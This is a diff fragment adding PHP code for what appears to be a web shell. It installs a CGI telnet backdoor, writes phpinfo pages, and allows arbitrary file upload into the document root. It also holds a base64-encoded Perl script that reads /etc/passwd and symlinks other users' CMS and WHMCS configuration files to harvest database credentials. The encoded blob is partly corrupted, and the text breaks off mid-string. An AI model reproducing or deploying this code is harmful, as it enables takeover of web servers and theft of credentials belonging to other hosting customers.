+				}
+				if(getfile("cgitelnet2")) {
+					chmod('idx_cgi/cgitelnet2.idx', 0755);
+					print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_cgi/cgitelnet2.idx' frameborder='0' scrolling='yes'></iframe>";
+				}
+				else {
+					print color(1, 1, "Error while downloading file CGI Telnet.");
+					@rmdir(path()."/idx_cgi/");
+					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Linux") @exe("rm -rf ".path()."/idx_cgi/");
+					if(!@rmdir(path()."/idx_cgi/") AND OS() === "Windows") @exe("rmdir /s /q ".path()."/idx_cgi/");
+				}
+			}
+	
+		}
+		elseif($args === "phpinfo") {
+			if(file_exists('phpinfo.php') AND preg_match("/phpinfo()/", file_get_contents('phpinfo.php'))) {
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
+			}
+			else {
+				if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create file 'phpinfo'."));
+				save("phpinfo.php", "w", "<?php print '<html><style>html,body {background: #000000;}</style><div style=\'background: #000000; color: #cccccc;\'>'; phpinfo(); print '</div></html>'; ?>");
+				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/phpinfo.php' frameborder='0' scrolling='yes'></iframe>";
+			}
+		}
+	}
+	elseif($toolsname === "upload") {
+		if($_POST['upload']) {
+			if($_POST['uploadtype'] === '1') {
+				if(@copy($_FILES['file']['tmp_name'], path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."")) {
+					$act = color(1, 2, "Uploaded!")." at <i><b>".path().DIRECTORY_SEPARATOR.$_FILES['file']['name']."</b></i>";
+				} 
+				else {
+					$act = color(1, 1, "Failed to upload file!");
+				}
+			} 
+			elseif($_POST['uploadtype'] === '2') {
+				$root = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
+				$web = $_SERVER['HTTP_HOST'].DIRECTORY_SEPARATOR.$_FILES['file']['name'];
+				if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
+					if(@copy($_FILES['file']['tmp_name'], $root)) {
+						$act = color(1, 2, "Uploaded!")." at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
+					} 
+					else {
+						$act = color(1, 1, "Failed to upload file!");
+					}
+				} 
+				else {
+					$act = color(1, 1, "Failed to upload file!");
+				}
+			}
+		}
+		print "Upload File: $act
+			  <form method='post' enctype='multipart/form-data'>
+			  <input type='radio' name='uploadtype' value='1' checked>current_dir [ ".writeable(path(), "Writeable")." ] 
+			  <input type='radio' name='uploadtype' value='2'>document_root [ ".writeable($_SERVER['DOCUMENT_ROOT'], "Writeable")." ]<br>
+			  <input type='file' name='file'>
+			  <input type='submit' value='upload' name='upload'>
+			  </form>";
+	}
+	elseif($toolsname === "symlink") {
+		$args = explode(" ", $args);
+
+		if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_sym'."));
+		if(empty($args[0])) {
+			if(!is_dir(path()."/idx_sym/")) {
+				$sym['code'] = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQoNCiMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgDQojICAgICAgICAgQ3JlYXRlZCA6IDEyIEZlYiAyMDE3DQojICAgICAgICAgQXV0aG9yIDogMHgxO0x4d957169be41a75F466C49F955024E0644992890gaHR0cDovLzB4ZGFyay5ibG9nc3BvdC5jb20NCiMgICAgICAgICBXYW50IHRvIHJlY29kZSA/IERvbid0IGZvcmdldCBmaXJzdCBhdXRob3INCiMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMNCg0KIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyANCiMgICAgICAgICBSZWNvZGVkIEJ5IDogTDBjNGxoMzRydHogLSBJbmRvWHBsb2l0DQojICAgICAgICAgTW9yZSBJbmZvIDogaHR0cDovL2luZG94cGxvaXQub3IuaWQNCiMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMgIyAjICMNCg0KDQp1c2UgRmlsZ0x4d957169be41a75F466C49F955024E0644992890kIiwicGFzc3dkLnR4dCIpIDsNCm9wZW5kaXIgbXkgJGRpciwgIi92YXIvbWFpbCI7DQpteSBAZmlsZXMgPSByZWFkZGlyICRkaXI7DQpjbG9zZWRpciAkZGlyOw0KcHJpbnQgIkNvbnRlbnQtdHlwZ0x4d957169be41a75F466C49F955024E0644992890yaWN0Ow0KdXNlIHdhcm5pbmdzOw0KbWtkaXIgImlkeF9zeW0iOw0KcHJpbnQgQGZpbGVzLiI8YnI+IjsNCm15ICRmaWxlbmFtZSA9ICdwYXNzd2QudHh0JzsNCm9wZW4obXkgJGZoLCAnPDplbmNvZGluZyhVVEYtOCknLCAkZmlsZW5hbWUpOw0Kd2hpbGUgKG15ICRyb3cgPSA8JGZoPikgew0KCWNob21wICRyb3c7DQoJbXkgQG1hdGNoZXMgPSAkcm93ID1+IC8oLio/KTp4Oi9nOw0KDQoJc3ltbGluaygiL2V0Yy9wYXNzd2QiLCJpZHhfc3ltL3Bhcy50eHQiKTsNCg0KCWlmICgtZCAiL2hvbWUiLiQxLiIvcHVibGljX2h0bWwvIikgeyANCgkJc3ltbGluaygiL2hvbWUvIi4kMS4iLy5hY2Nlc3NoYXNoIiwiaWR4X3N5bS8iLiQxLiItV0hNLWFjY2Vzc2hhc2gudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAiLCJpZHhfc3ltLyIuJDEuIi1Mb2tvbWVkaWEudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItcGhwQkIudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zaXRlcy9kZWZhdWx0L3NldHRpbmdzLnBocCIsImlkeF9zeW0vIi4kMS4iLURydXBhbC50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2NvbmZpZy9zZXR0aW5ncy5pbmMucGhwIiwiaWR4X3N5bS8iLiQxLiItUHJlc3RhU2hvcC50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2FwcC9ldGMvbG9jYWwueG1sIiwiaWR4X3N5bS8iLiQxLiItTWFnZW50by50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1PcGVuQ2FydC50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2FwcGxpY2F0aW9uL2NvbmZpZy9kYXRhYmFzZS5waHAiLCJpZHhfc3ltLyIuJDEuIi1FbGxpc2xhYi50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1WYnVsbGV0aW4udHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9pbmNsdWRlcy9jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItVmJ1bGxldGluLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVZidWxsZXRpbi50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2ZvcnVtcy9pbmNsdWRlcy9jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItVmJ1bGxldGluLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2MvaW5jbHVkZXMvY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVZidWxsZXRpbi50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItTXlCQi50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAiLCJpZHhfc3ltLyIuJDEuIi1Pc0NvbW1lcmNlLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRlcy9jb25maWd1cmUucGhwIiwiaWR4X3N5bS8iLiQxLiItT3NDb21tZXJjZS50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL29zL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAiLCJpZHhfc3ltLyIuJDEuIi1Pc0NvbW1lcmNlLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvb3Njb20vaW5jbHVkZXMvY29uZmlndXJlLnBocCIsImlkeF9zeW0vIi4kMS4iLU9zQ29tbWVyY2UudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9wcm9kdWN0cy9pbmNsdWRlcy9jb25maWd1cmUucGhwIiwiaWR4X3N5bS8iLiQxLiItT3NDb21tZXJjZS50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2NhcnQvaW5jbHVkZXMvY29uZmlndXJlLnBocCIsImlkeF9zeW0vIi4kMS4iLU9zQ29tbWVyY2UudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9pbmMvY29uZl9nbG9iYWwucGhwIiwiaWR4X3N5bS8iLiQxLiItSVBCLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVdvcmRwcmVzcy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3dwL3Rlc3Qvd3AtY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVdvcmRwcmVzcy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVdvcmRwcmVzcy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVdvcmRwcmVzcy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3BvcnRhbC93cC1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItV29yZHByZXNzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItV29yZHByZXNzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVdvcmRwcmVzcy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL1dQL3dwLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Xb3JkcHJlc3MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Xb3JkcHJlc3MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVdvcmRwcmVzcy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVdvcmRwcmVzcy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2RlbW8vd3AtY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVdvcmRwcmVzcy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVdvcmRwcmVzcy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3YxL3dwLWNvbmZpZy5waHAiLCJpZHhfc3ltLyIuJDEuIi1Xb3JkcHJlc3MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC92Mi93cC1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItV29yZHByZXNzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVdvcmRwcmVzcy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwIiwiaWR4X3N5bS8iLiQxLiItV29yZHByZXNzLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCIsImlkeF9zeW0vIi4kMS4iLVdvcmRwcmVzcy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwIiwiaWR4X3N5bS8iLiQxLiItSm9vbWxhLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCIsImlkeF9zeW0vIi4kMS4iLUpvb21sYS50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1eV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAiLCJpZHhfc3ltLyIuJDEuIi1Kb29tbGEudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwIiwiaWR4X3N5bS8iLiQxLiItSm9vbWxhLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvcG9ydGFsL2NvbmZpZ3VyYXRpb24ucGhwIiwiaWR4X3N5bS8iLiQxLiItSm9vbWxhLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCIsImlkeF9zeW0vIi4kMS4iLUpvb21sYS50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAiLCJpZHhfc3ltLyIuJDEuIi1Kb29tbGEudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwIiwiaWR4X3N5bS8iLiQxLiItSm9vbWxhLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCIsImlkeF9zeW0vIi4kMS4iLUpvb21sYS50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3Rlc3QvY29uZmlndXJhdGlvbi5waHAiLCJpZHhfc3ltLyIuJDEuIi1Kb29tbGEudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC92MS9jb25maWd1cmF0aW9uLnBocCIsImlkeF9zeW0vIi4kMS4iLUpvb21sYS50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwIiwiaWR4X3N5bS8iLiQxLiItSm9vbWxhLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwIiwiaWR4X3N5bS8iLiQxLiItSm9vbWxhLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwIiwiaWR4X3N5bS8iLiQxLiItSm9vbWxhLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvd2htY3MxL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL1dobWNzL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL1dITUMvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC93aG1jL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL1dITS9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvd2htL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL0hPU1Qvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9ob3N0L3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL1NVUFBPUlRFUy9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvc3VwcG9ydGVzL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2RvbWFpbnMvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL0hvc3Rpbmcvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvSE9TVElORy9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL0NBUlQvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQ2FydC9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL09SREVSL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL09yZGVyL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL0NMSUVOVC9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9DbGllbnQvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL0NMSUVOVEFSRUEvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQ2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL1NVUFBPUlQvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvU3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL0JJTExJTkcvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQmlsbGluZy9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL0JVWS9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9CdXkvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL01BTkFHRS9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9NYW5hZ2Uvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL0NMSUVOVFNVUFBPUlQvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQ2xpZW50U3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwIiwiaWR4X3N5bS8iLiQxLiItV0hNQ1MudHh0Iik7DQoJCXN5bWxpbmsoIi9ob21lLyIuJDEuIi9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAiLCJpZHhfc3ltLyIuJDEuIi1XSE1DUy50eHQiK0x4d957169be41a75F466C49F955024E0644992890iL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQ0hFQ0tPVVQvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvY2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCIsImlkeF9zeW0vIi4kMS4iLVdITUNTLnR4dCIpOw0KCQlzeW1saW5rKCIvaG9tZS8iLiQxLiIvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V